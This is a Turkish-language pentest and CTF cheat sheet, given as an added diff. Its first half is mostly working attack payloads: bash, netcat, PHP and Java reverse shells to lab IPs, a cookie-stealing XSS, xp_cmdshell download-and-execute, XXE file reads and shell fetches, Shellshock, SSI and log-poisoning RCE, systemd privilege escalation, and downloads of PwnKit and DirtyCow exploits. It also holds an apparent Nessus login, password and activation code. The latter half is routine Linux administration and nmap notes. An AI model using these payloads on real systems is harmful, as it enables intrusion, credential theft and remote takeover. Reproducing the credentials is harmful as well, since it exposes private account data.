@@ -1,0 +1,1036 @@
+
+ find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
+ 
+ 
+#######################################################################################################
+
+echo " "  | base64 -d	     #Echodan sonra tırnak işaretindeki metini base64e göre  decode eder
+echo ""   | xxd  -r -p       #Echodan sonra tırnak işaretindeki metini ASCII ye göre decode eder.
+sha256sum  dosya_adi         #Dosya hash ini öğreniriz
+
+
+echo "QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y=="  | base64 -d
+####################################################
+*
+smb dosya paylaşımı  port 139,445.. 
+*
+smbmap -H IP                                 #paylaşıma açık olan dizinleri araştırır.
+
+smbclient -N -L //10.10.177.57//             #Paylaşılan dizinleri listeler
+
+smbclient -U test1  //192.168.1.101/test1    #test1 kullanıcısıyla  paylaşılan test1 dizinine bağlanır
+
+
+smbclient //IP/paylaşılan_dizin         #Paylaşılan dizine şifresiz bağlanır.
+
+crackmapexec smb 10.10.175.103 -u guest -p "" --shares
+
+
+###################################################3
+
+fcrackzip -D -p /usr/share/wordlist/rockyou.txt -u backups.zip -v    #şifreli zip dosyalarını kırar
+                                                  		    -D  -p string dosyası kullan	
+                                                  		    -u kıralacak unzip dosya
+                                                  		    -v gereksizleri gösterme
+                                                  		  
+
+####################################################
+RCE
+
+reverse
+" bash -i >& /dev/tcp/10.9.187.200/5001  0>&1 "
+
+
+##################################
+wp-scan
+
+username discover payload	
+wpscan  --url http://10.10.101.30/wordpress/  --enumerate u,ap         
+ 
+
+for i in $(seq 9800 9900); do echo "connecting to port $i"; ssh -o 'LogLevel=ERROR' -o 'StrictHostKeyChecking=no' -p $i test@10.10.185.139;done | grep -vE 'Lower|Higher'
+	
+
+########################################################################################################
+log analizi
+
+cat access.log| awk -F " " '{print $12,$13,$14}' 
+
+
+
+/etc/shadow
+#######################################################################################################
+shellde düzenleme
+
+  
+/usr/bin/python  -c 'import pty; pty.spawn("/bin/bash")' 
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+bash -i  dene
+
+
+ctrl-z
+
+stty raw -echo; fg
+
+lsb_release -a    # işletim sistemi hakkında bilgi verir
+
+
+web shell
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.1.87/4444 0>&1'");?>
+
+php-sh.php#00.jpg
+
+ep
+sudo python3 -c 'import os; os.syst	em("/bin/sh")'
+./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+
+echo ‘import pty; pty.spawn(“/bin/sh”)’ > bak.py
+import os
+os.system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.187.200 5001 >/tmp/f')
+
+
+http://10.8.1.87:8000/beyaz-orkideler.jpeg
+
+	http://10.8.1.87:8000/php-sh2.php
+
+
+python hack -t  172.17.0.2  -c   id
+python3  hack  -t  172.17.0.2  -c   id
+python2  hack  -t  172.17.0.2  -c   id
+
+
+
+
+
+
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.9.137.15/4321 0>&1'
+
+lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
+
+
+
+
+nikto -host http://10.10.207.22:8080/ -id joker:hannah
+
+
+
+*********************************************************************
+
+reverse shellde ekranı temizler
+export TERM=screen                  	
+
+alias x='printf "\033c"'                
+
+php?cmd=pwd payload xss
+
+
+reverseshell url encode etmeyi unutma
+
+php -r '$sock=fsockopen("10.9.137.15",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+############################################################################################
+SQL payload
+
+
+  '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+
+ '; EXEC xp_cmdshell 'certutil -urlcache -f http://10.9.137.15:8000/windows-reverse.exe C:\Windows\Temp\windows-reverse.exe'; --
+
+ ' ; EXEC xp_cmdshell 'C:\Windows\Temp\windows-reverse.exe'; --
+	
+
+
+
+
+
+' or 1=1 -- 
+
+
+mysql -h {hostname} -u username -p {databasename}
+Password: {your password}		
+
+
+
+show databases;
+use tablo_ismi;
+
+
+
+
+################################################################
+
+gobuster 
+gobuster dir -u  http://bricks.thm/2024/04/02/brick-by-brick/  -w   /usr/share/wordlists/dirb/common.txt --exclude-length  472
+
+
+
+
+subdomain  enumeration mode
+	gobuster dns -d reports.solarflare.hv -w /usr/share/wordlists/amass/subdomains
+
+
+
+
+http://10.8.1.87:8000/php-sh2.php
+
+
+
+
+
+
+###################################################################3
+SSRF
+
+
+ffuf -u  http://10.10.31.26/export2.pdf  -d  "url=http://127.0.0.1/FUZZ"   -H  "Content-Type:  application/x-www-form-urlencoded"   -H   "Cookie: PHPSESSID=9f337589e85f941bd92b2be2f343ec45"    -w/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words   -e .txt,.php -fw 354
+			
+XSS PAYLOAD
+
+<script>alert("TEST XSS")</script>
+
+
+
+###############################################################################################
+*
+Karşıya dosya yükleme
+wget http://10.9.187.200:8000/les.sh
+wget http://10.9.187.200:8000/linpeas.sh
+
+reverseshell
+wget http://10.9.187.200:8000/shell.sh
+wget  http://192.168.214.128:8000/wshell.php
+scp file.zip root@192.168.10.10:/backup/file.zip
+wget http://10.9.187.200:8000/php-sh.php -o script.php
+
+
+$url ="http://10.9.187.200:8000/windowShell.php"
+
+
+#exploit
+wget http://10.9.187.200:8000/PwnKit.c
+wget http://10.9.187.200:8000/dirty.c
+
+
+gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
+gcc -pthread dirty.c -o dirty -lcrypt
+
+
+
+
+wget http://10.9.187.200:8000/build-alpine	
+wget http://10.9.187.200:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+
+
+
+
+
+LOCAL
+wget  http://192.168.214.128:8000/les.sh
+wget  http://192.168.214.128:8000/PwnKit.c
+
+
+
+
+#################################
+
+curl 10.9.187.200:8000/les.sh -o  les.sh
+curl 10.9.187.200:8000/linpeas.sh -o  linpeas.sh
+curl 10.9.187.200:8000/PwnKit.c -o PwnKit.c
+curl 10.9.187.200:8000/d.sh -o d.sh
+
+##############
+
+
+	
+
+*
+Karşıdan doya çekme
+scp root@192.168.10.10:/backup/file.zip /root/backup/
+scp -P 1111 root@192.168.10.10:/backup/file.zip /root/backup/
+scp -i private_key.pem root@192.168.10.10:/backup/file.zip /root/backup/
+
+
+
+10.9.187.200
+*
+hydra -L users.txt -P /usr/share/wordlist/rockyou.txt 10.0.2.5 htstp-post-form  "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
+*
+<script> document.location= 'http://10.9.137.15:4444/XSS/grabber.php?c='+document.cookie </script>
+
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.137.15 4445 >/tmp/f"  >  /opt/helloworld.sh
+
+
+
+#############################################3
+
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.9.135.15:8000/php-reverse-shell.php;'>">
+%eval;
+%exfiltrate;
+
+
+session_key:
+a4ea55d5e8e7d9871b0f47e8641024a86ed11f63d06ca7793d5af122110b
+
+#############################################
+
+systemctl list-units --type=service --state=running
+çalışan tüm servisleri listeler
+
+/etc/systemctl ROOT=(ALL) ROOT
+systemctl pe
+
+
+
+[Unit]
+This is an example service.
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.6.132/4444 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+
+
+
+##################################################
+
+
+
+
+
+
+
+#######################################################################################################
+jenkins paylod
+
+
+String host="10.9.137.15";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+
+	
+String host="10.9.137.15";
+int port=6996;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+
+
+#######################################################################################################
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'10.9.187.200:8000/shell.php'">
+]>
+<root>
+  <name>Joe</name>
+  <tel>ufgh</tel>
+  <email>START_&file;_END</email>
+  <password>kjh</password>
+</root>	
+
+###########################################
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "expect://curl$IFS-O$IFS'10.9.187.200:8000/shell.php'">
+<comment>
+  <name>&name;</name>
+  <author>Pavandeep</author>
+  <com>Hacking Articles</com>
+</comment>
+
+##################################
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
+<comment>
+  <name>&name;</name>
+  <author>Pavandeep</author>
+  <com>Hacking Articles</com>
+</comment>
+
+#################
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
+<comment>
+  <name>&name;</name>
+  <author>Pavandeep</author>
+  <com>Hacking Articles</com>
+</comment>	
+
+##################################################3
+yazmaya izinli dosyaları arama
+
+
+find / -perm /4000 -exec ls -la {} \; 2> /dev/null   
+find / -perm -4000  2> /dev/null   	
+
+getcap -r /  2>/dev/null
+find / -perm -222 -type d 2>/dev/null            
+find / -perm -u=s -type f 2>/dev/null
+find / -user #archangel# 2>/dev/null
+
+	
+find / -perm -u=s -type f 2>/dev/null
+find / -name id_rsa 2>/dev/null
+find / -group  death -type f  2>/dev/null
+
+find / -user bob -type f -cmin -1   # Son bir dakika içinde oluşturulan veya değiştirilen dosyaların listesini alın.
+		
+
+
+echo "bash -i >& /dev/tcp/10.8.9.37/8080 0>&1" > /home/toby/jobs/cow.sh   
+sudo -u toby /bin/bash
+
+
+echo "bash -i >& /dev/tcp/192.168.214.128/3080 0>&1"   >write.sh
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.214.128 5003 >/tmp/f
+
+
+exec bash --login
+ftp de chmod 777 ver direk reverse shell alırsın linkten
+
+ssh private key connection
+id_rsa dosyasına chmod 600 yetkisi ver
+bağlanmazsa ssh2john la id_rsa dosyasını kır  
+
+
+
+fim  -- terminalde resim dosyaları açma
+
+#######################################################
+openssl passwd -1 -salt kullanıcı şifre
+
+
+passwd dosyasına kullanıcı eklerken hash ini oluşturur.
+#############################################################################
+
+
+nessuss
+paposab435@artgulin.com
+Tu9a;gMDTu9a;gMD
+
+
+Aktivasyon Kodu: C26K-FESK-K3LT-9UDC	
+
+############################################################################
+
+
+
+lfı reverse shell
+log position 
+
+nc 172.20.5.125 80
+
+
+<?php passthru('nc -e /bin/sh 10.8.6.132 1515'); ?>
+
+
+
+nc 172.20.4.84  80 GET thankyou.php?file=<?php passthru($_GET[‘ls’]); ?> HTTP/1.1
+
+
+####################################################################################################
+PAYLOAD
+
+wordpress backdoor >>>    exploit/multi/http/wp_crop_rce
+
+
+#########################################################################
+günlük zehirlemsi
+
+curl 
+‘http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log’ -H ‘User-Agent: <?php system($_GET[‘cmd’]); ?>’
+
+
+mafialive.thm/test.php?view     
+=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=wget 10.9.137.15:8000/php-reverse-shell.php  -O /tmp/reverse.php
+
+http://mafialive.thm/test.php?view      
+=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=chmod 777 /tmp/reverse.php; php /tmp/reverse.php
+
+
+######################################################################################################
+*
+LFI
+*
+
+php://filter/convert.base64-encode/resource=../../../../../wp-config.php
+
+php://filter/convert.base64-encode/resource=/home/blue/.bash_history | base64 -d  
+
+KARŞIYA LFI YLA DOSYA YÜKLEYİP ÇALIŞTIRMA
+wget${IFS}http://10.9.187.200:8000/shell.sh
+
+wget${IFS}http://192.168.214.128:8000/wshell.php
+
+bash${IFS}shell.sh
+
+
+#################################################################################################3
+*
+SHELLSHOCK PAYLOAD
+*
+
+() { :; }; echo; /bin/cat /etc/passwd 
+
+() { :; };  /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.214.128 1313 >/tmp/f'    reverseshell burp  for User Agent
+
+curl -H 'User-Agent: () { :; };  /bin/bash -c   "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.214.128 1111 >/tmp/f" '  http://192.168.214.131/bWAPP/cgi-bin/shellshock.sh        curl
+
+
+##########################################################################
+SLL injection payload
+
+<!--#exec cmd="ls" -->
+
+
+<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
+
+
+<!--#exec cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.214.128 5001 >/tmp/f" -->
+
+
+
+#################################################################################
+	
+ 
+../../../../../../../../../etc/passwd	
+/..//..//..//..//..//..//etc/passwd
+
+/..//..//..//log/apache2/access.log
+
+
+GIF8;
+<?php system($_REQUEST[' cmd ']); ?>
+
+
+<?php system($_GET['cmd']); ?>
+
+ """
+ 
+##########################################################
+
+systemctl pe
+
+TF=$(mktemp).service
+echo '[Service]
+ExecStart=/bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.8.6.132 5002 >/tmp/f"
+[Install]
+WantedBy=multi-user.target' > $TF
+
+sudo systemctl link $TF
+sudo systemctl enable --now $TF
+
+##################################################################################################################
+********************************************** Adli Bilişim ************************************************************
+
+audacity       #Ses analizi için kullanılan tool. 
+zsteg -a       #Bir resim içerisindeki gizli metini çıkartır. Desteklenen türlere dikkat et 
+https://georgeom.net/StegOnline/upload    #Online renk ayarlarıyla oynuyor
+
+ 
+pdfimages -all sus.pdf ext   #pdf de filigran kaldırır.
+
+############################################################################################################
+
+
+.
+chfn  kullanıcı      #kullanıcıya ait bilgilerde güncelleme yapmamızı sağlar
+
+chage -l kullanıcı   #kullanıcı hakkınad bilgi verir
+
+usermod -L kullanıcı #ilgili kullanıcıyı pasif hale getirir birdaha oturum açamaz
+
+usermod -U kulanıcı  #ilgili kullanıcıyı tekrar aktif eder.
+
+su                   #kullanıcılar arasında geçiş yapmamızı sağlar.
+
+killall              #ilgili kullanıcıda süreçleri zorla kapatır.
+
+histoy -c            #teminal geçmişini temizler
+
+grep                 #dosyada yada klasörde arama sağlar
+
+shred -u -z          #dosyayı sistemden geri dönüşümsüz şekilde kalıcı olarak siler.
+
+
+
+gpg -c               # komutuyla dosyayı simetrik olarak şifreler
+
+gpg -d               # komutuytla key varken dosya okunabilir.
+
+cat /etc/passwd      #Burada kullancıların  isimlerini, ıd değerlerini ve ev dizinlerini gösterir.
+                     >Her kullanıcı erişebilir.
+
+cat /etc/shadow      #Burada kullanıcıların şifrelerinin hash değerlerini görebiliriz.
+                     >Sadece root kullanıcıları erişebilir.
+
+cat /etc/sudoers     #Hangi kullanıcılar hangi yetkilere ve izinlere sahip görebiliriz.
+                     #sadece root kullanıcıları erişebilir.
+
+cat /etc/gruop                                          #kullanıcıların hangi grupta olduğunu gösterir. 
+
+sudo addgroup grup_Adi                                  #yeni grup oluşturur.
+sudo delgroup grup_adi                                  #gösterilen grubu kaldırır
+sudo usermod -a -G grup_ismi kullanıcı_ismi             #gösterilen gruba gösterilen kllanıcı ekler
+
+sudo chown yeni_kullanıcı dosya_ad                      #gösterilen dosyanın sahipliğini değiştirir.
+sudo chgrp yeni_grup dosya_adı                          #gösterilen dosyanın sahip olduğu grubu değiştir.
+sudo chwon -R yeni_kullanıcı dosya_adı                  #dizinin içindekiylerde birlikte sahipliği değiştir.
+
+
+********************************************dosya yetkileri****************
+
+
+read    - okuma      #Değeri 4
+write   - yazma      #Değeri 2
+execute - çalıştırma #Değeri 1
+ 
+-rwxrwxrwx = 777
+Bir dosya sahipliğinin max değeri 777dir tüm yetkileri barındırır.
+  #Kullanıcı                için 4(read) + 2(write) + 1(execute) = 7
+  #Grup                     için 4(read) + 2(write) + 1(execute) = 7
+  #Diğer kullanıcılar için  için 4(read) + 2(write) + 1(execute) = 7
+
+sudo nano /etc/login.defs     #login.defs dosyasındaki umax değerini 022 den 077 çekilerek yeni oluşturulan kullanıcılar arasındaki dizin erişinini sınırlayabilirz.
+
+
+
+
+sudo -l(le)           #Kullanıcıda hangi yetkiler olduğunu gösterir.
+
+sudo -i               #Direk root kullanıcısına geçiş yapar
+
+sudo  useradd  #              >#  kullanıcısını  oluşturur    
+
+sudo passwd    #              >#  kullanıcısının parolasını oluşturur
+sudo usermod  -aG sudo  #     ># kullacısını sudo grubuna dahir eder.
+
+sudo userdel  #               >#  kullanıcısını siler.
+
+sudo usermod  # yıl-ay-gün    ># kullanıcının kullanım süresini güncelledi
+
+sudo passwd -e  #             >#  kullanıcısına yönetici tarafından geçişi şifre atandı.
+
+sudo chmod 700 *              >Yeni oluşturulan kullanıcılar arasında dizin yetkisini düzenler
+
+sudo visudo                   >sudoers dosyasını düzenler. Sadece root kullanıcısı erişebilir.
+
+sudo useradd # -m-d /home/# -s /bin/bash -e yıl-ay-gün   ># kullanıcısı oluştururldu, ev dizini , temel kabuk ve kullanım süresi yıl-ay-gün şeklinde tanımlandı 
+
+"#" oluşturulan kullanıcıyı temsil eder.
+
+
+################################################# Güvenlik ⁮duvarı ################################
+
+sudo iptables -L -v                           #IPv4 için daha geniş güvenlik duvarı sorgusu 
+
+#KABUL ET KURALLARI
+
+sudo ip6tables  -L      #IPv46için güvenlik duvarı sorgusu
+
+sudo iptables -A INPUT -m conntrack  --ctstate ESTABLISHED,RELATED  -j ACCEPT  #Bağlantıyı takip et ve kabul et
+
+sudo iptables -A INPUT -p tcp  --dport ssh  -j ACCEPT                          #ssh bağlantısnı kabul eden protokolü ve portu tanımladık.( 22.port)
+
+sudo iptables -A INPUT -p upd  --dport 53  -j ACCEPT                           #dns  servisiyle upd protokolü araçılıyla bağlantı kurdu   (53.port)
+
+sudo iptables -A INPUT -p tcp  --dport 53  -j ACCEPT                           #dns servisiyle tcp protokülü araçılıyla bağlantı kurdu
+
+sudo iptables -I INPUT l -i lo -j ACCEPT                                       #sistemin kendi kendine loopack yapmayacak
+
+sudo iptables -A INPUT -m conntrack -p  icmp -icmp-tpye 3 --ctstate NEW,ESTABLİSHED,RELATED -j ACCEPT    #icmp 3 olan yani ulaşılamaz mesajlara müsade et
+
+sudo iptables -P INPUT -j drop    #temel protokol olarak drop tanımladık
+
+sudosudo /sbin/iptables-save      #tanımladıgımız kuralları kalıcı olarak kaydeder.
+
+sudo iptables -F
+sudo /sbin/iptablese-save
+##-F parametresiyle protokolleri sıfırlıyoruz ve alttaki komutla kaydediyoruz.
+
+
+
+##############################################Dosya ve Dizin işlemleri#############################################
+
+rm      #dosya silme
+rm -r   #klasör silme
+cp  kopyalanacak_dosya   kopyalanan_dosyanin_yeni_ismi            #birebir dosya kopyalar ve yeniden isimlendirir
+
+cp  kopyalanacak_dosya	 kopyalanacak_dosyanin_yeni_dizini/       #kopyalanacak dosyanin nereye kopyalanacagını belirtiriz
+
+cp /home/byroo1/Desktop/odevler/ogrenci.pdf  /tmp/ogrenci2.pdf    #kopyalanacak dosya tam adresini ve nereye kopyalayaracagız adres yazarak yapabiliriz.
+
+cp -r kopyalacak_klasör_ismiveya_adresi yeni_isim_Veyaadresi      #verilen isimdeki yada adresteki istenilen yere ve adda klasör koplayalar(içindekilerle beraber)
+
+mv taşınacak_dosya nereye_taşınacak                                   #taşınacak dosyayi hedef dosyaya taşır
+
+tar -zcvf arşiv_Adi.tar  hangi_dosya_dosyalar_arşivlenecek            #söylenen dosyaları arşivler
+
+tar -zxvf  açılacak_arşiv.tar  nereyecı kartılacak_Adres              #arşivden dosyayı söylediğidizine cıkartır
+
+cat dosya_Adi     #dosyaları okumamızı sağlar
+   -E             # E parametresi satır sonlarını($) işaretiyle belirtir
+   -n             # n parametresi her satırın başında satır numarasını belirtir.
+
+tac dosya_adi       #dosyayı son satırdan başlayarak okur
+
+tail  dosya_adi     #okukacak dosyadan varsayılan olarak son 10 satırı okur
+
+tail -f dosya_adı   #belirtilen dosyayı canlı olarak okur takip eder
+ 
+more dosya_adi      #belirtilen dosyayı terminal penceresine  sığdırarak okur
+
+no dosya_Adi        #belirtilen dosyadaki boş satırlar hariç numaralandırır.
+
+file dosya_Adi      #belirtilen dosya hakkında ayrıntı verir
+
+wc dosya_adi        #belirtilen dosyadaki sırayla satır-kelime-boyut  hakkındaki ayrıntıları gösterir
+
+wc -w dosya_adi     #belirtilen dosyadaki sadece kelime sayısını gösterir
+
+wc  -l dosya_Adi    #belirtilen dosyadaki sadece satır sayısını gösterir
+
+wc  -c  dosya_adi   #belirtilen dosyanın sadece boyutunu gösterir.
+
+
+sort dosya_adi                   #belirtilen dosyadaki verileri k>>>b doğru sıralar
+
+sort -k satırSayisi dosya_adi    #dosyadaki verileri verilen sutuna göre k>>>b doğru sıralar.
+
+sort  -c  dosya_Adi              #dosyanın sıralanıp sıralanmadığını kontrol eder
+
+sort -r dosya_adi                #dosyayi tersten sıralar.
+
+sort -k 2 -r dosya_adi           #dosyayi 2.sutundan tersten sıralarak gösterir.
+      -o   sıralı_dosya_Adi      #istenilen sıralamayı istenilen adla kaydeder.
+        
+sort -R dosya_adi                #dosyayı rasgele sıralayıp gösterir.  
+  
+grep 'aranacak kelime' dosya_adi            #  '' içindeki kelimeyi belirtilen dosyada  arar.
+
+grep -v 'aranacak kelime' dosya_Adi         #verilen dosyada -v parametresi sayesinde verilen kelimenin olmadığı satırları gösterir.
+
+grep -i 'aranacak kelime' dosya_adi         #-i parametlesiyle büyük kücük duyarlılığını kapatır.
+
+grep -i 'aranacak kelime' -l dosya_adlari   # -l parametresiyle verilen kelimenin hangi dosyalar içinde olmadığını gösterir.
+
+grep -i 'aranacak kelime' -c dosya_adi      #verilen kelimenin dosyada kaç kere geçtiğini gösterir.
+
+
+ ***************************************wildcard ************
+
+*     #bir yada birden fazla karakterin yerine geçebileçek bir joker karakterdir
+[]    #yerine geçebileçek karakterileri küme şeklinde belirtlen bir wildcard oparatörüdür.
+?     #yalnız bir karakterin yerine geçebilecek bir joker karakteridir.
+
+
+
+*******************yönlendirme karakterleri*******************************
+ 
+>    # verilen verileri dosyaya ekler veya yeni dosya oluşturup ekler. dosyadaki verileri siler
+>>   # verilen verileri dosyanın sonuna yazar. içeriği tamamen silmez
+|    # verilen çoklu görevleri aynı anda yapmamızı sağlar.soldan sağa çalışır
+
+	
+alias  #istenilene göre çok uzun bir komutu yeniden aklandıralar onu daha hızlı kullanmamızı sağlar
+ örn#   alias c="history -c"  burada artık history -c yerine sadece c yazmamış yeterlidir
+
+ls -al  #dosyaların sahipliklerini ayrıntılı bir şekilde gösterir. Kısayolu ll dir
+
+ls -alt #oluşturulma zamanına göre listeler.
+
+
+*****************************************süreçler****************************************************
+
+
+
+
+pkill program_adi   #belirtilen programı process id ini otomoatik kendi tespit ederek kapatır
+
+
+
+firefox &   #terminalden bu komutu çalıştırırsak arka planda 
+çalışmaya devam eder ve biz terminali kullanabiliriz fakat terminali 
+kapatınca arkaplana attığımız uygulamada çalışmaya devam eder.
+
+nohup uygulama  #uygulamayı terminalden bağımsız arka planda çalıştırır
+disown -h %id_numarası   #terminalden acılan process in terminalle bağlantısı kesilir
+
+
+systemctl  #linuxta sistem üzerindeki servisleri yönetmemizi sağlar
+systemctl list-units --type service #sistem üzerinde  çalışan servisleri listeler
+                                    --state running #sistem üzerinde sadece o an çalışan servisleri listeler
+
+
+sysctl status servis_adi   #istenilen servis hakkında ayrıntıllı bilgi verir.
+
+
+
+
+
+************************AĞ TEMELLERİ***************************
+
+hostname -I   #bilgisayarın sadece ip adresini verir
+ip a          #ayrıntılı bilgi verir
+ 
+sudo tcpdump -v #tcp protokolü üzerinden geçen ağ trafiğini izler
+iftop           #ağ tarafiğini özet bir şekilde görüntüler
+
+
+sudo systemctl enable ssh   #ssh i aktif eder
+sudo systemctl disable ssh  #ssh i kapatır
+sudo systemctl stop ssh     #ssh durdurur.
+
+nslookup DNS  # dns sorgusu yapar
+nslookup -query=mx dns   #istenilen dns in main sunucularını gösterir
+nslookup -query=ns dns   #istenilen dns için isim sunucularını gösteir
+
+
+dpkg -i paket_adi                #apt ye alternatif paket yükleyici -i install parametresiyle kurar
+dpkg - l                         #paketleri listeler
+dpkg  -r paket_adi               #mevcut paketi kaldırır
+apt-cache depends uygulama_adi   #uygulama için gerekli paketleri listeler
+
+
+
+
+
+################ netcat ***********************
+
+
+-l    #listen moda geçer
+-p    #hangi porttan dinlecek belirlenir
+-e    #dosya aktarımı yapar.
+-v    # yapılan işlemler bağlantılar hakkında bilgi verir.Daha ayrıntılısı -vv
+ 
+
+
+###################### searchsploit #######################
+
+searhsploit ne_aranacaksa     
+
+searchsploit -x exploit # -x parametlesiyle exploit in içerisini görebilirz
+
+searchsploit -m exploit # -m parametresiyle exploit i indirebilriz
+
+
+
+
+
+id kullanıcı  #kullanıcıyla alakalı ayrıntılı bilgi verir
+useradd -s /bin/bash -m -d home/kullanıcı__adi -g sudo kullanıcı_Adi
+		 -s parametresiyle yeni kullanıcını hangi terminali kullanacgı belirtilir
+		 -m -d parametresiyle kullanıcıya ait dizin oluşturur.
+		 -g parametresiye kullanıcıyı belirtilen gruba dahil eder
+	userdell -r kullanıcı_Adı   #belirtilen kullanıcıyı tamamiyle siler
+
+
+ 
+netdiscover -i eth0    #ağ taraması yapar
+
+nbtscan  IP            #IP aralığındaki cihazların bios adını tespit eder.
+
+################### DNS sorgu ##############################################
+
+dig   domain       #A kaydı, dig sürümü, cevaplar hakkında teknik açıklamalar, yapılan sorgu hakkında istatistikler gibi bir çok bilgileri karşıya çıkarmaktadır.
+dig domain -short  # -short komutuyla A adresi (IP) öğrenilir.
+
+
+
+
+
+
+######################## nmap #######################################
+
+
+
+ 
+nmap	-sprict smb-enum-users.nse -p 445 ip_adresi
+	--sprict=smb-ob-discovery  
+
+# -sprict kullanılacak sprict  :i belirtiyoruz. Farklı sytanx lar olabilir.
+# -script smb-users.nse        :Bu script hedef sistemdeki user ları belirliyor
+# --script=smb-os.discovery    :Bu script hefeg sistemin işletim sistemi ve adını belirliyor
+# -p                           :taranacak portları belirtiyoruz. değer vermezsak tüm portları tarıyor
+# -sP                          :networkte belirli bir aralıkta ping taraması yapmamızı sğlar nmap -sP 192.168.1.0/24
+# -Pn                          :ping atmayarak sistemi tarar.
+# -sS                          :SYN taraması yapar
+# -sT                          :TCP taraması yapar
+# -sU                          :UDP taraması  yapar
+# -sn                          :port taraması yapmaz 
+# -sc                          : -sV ile versiyon tespiti yaparken scriptleri kullanır.
+# -n			       : DNS sorgulaması yapma
+#-v -vv -vvv                   :Ekrana gösterilecek detayları artırır.
+# -T(1,2,3,4)                  : -T Tarama hızını ifade eder. Default değeri 3 dür.1den 5 e tarama hızı artar.
+# -oN 			       : Tarama sonuçlarını bulunan dizine kaydeder
+# --top-ports=100 	       : İlk 100 portu tarar ********
+# -A                           :Yapılan tarama sonrası işletim sistemi ve bilgi toplama scriptlerini çalıştırır analiz yapar.
+# -sV                          :Yapılan taramada versiyonlari tespit eder
+# -O                           :ek olarak işletim sisteminide keşfeder
+# -f  --mtu 8                  :Paketleri parçalayarak gönderir. Firewall filtlemesi varsa atlatır. Default  mtu değeri değiştirilebilir.
+			      mtu değeriyle paketler kaç parça halinde gönderileçeği belirtilir. ( 0-9)
+#-D  IP,IP,IP  HEDEF-IP	       :Hedefe yapılan,gönderilen paketler farklı IP adreslerinden gönderirlerek IP gizlenebilir.
+
+
+dpkg -l   #Sistemde olan paketleri listeler
+dpkg -i paket_adi.deb  #istenilen paketi offline olarak kurar
+apt-cache depends uygulama_adi   #uygulama için gerekli paketleri listeler
+
+
+
+id kullanıcı  #kullanıcıyla alakalı ayrıntılı bilgi verir
+useradd -s /bin/bash -m -d home/kullanıcı__adi -g sudo kullanıcı_Adi
+	 -s parametresiyle yeni kullanıcını hangi terminali kullanacgı belirtilir
+	 -m -d parametresiyle kullanıcıya ait dizin oluşturur.
+	 -g parametresiye kullanıcıyı belirtilen gruba dahil eder
+userdell -r kullanıcı_Adı   #belirtilen kullanıcıyı tamamiyle siler
+
+
+addgroup yeni_grup #yeni grup oluşturur
+usermod -G grup_adi kullanıcı_adi  #kullanıcıyı belirtilen gruba ekler
+usermod -L kullanıcı_Adi  #kullanıcıyı kilitler 
+gpasswd -d kullanıcı_Adi grup_adi  #belirtilen kullanıcı belitrilen gruptan cıkartır
+
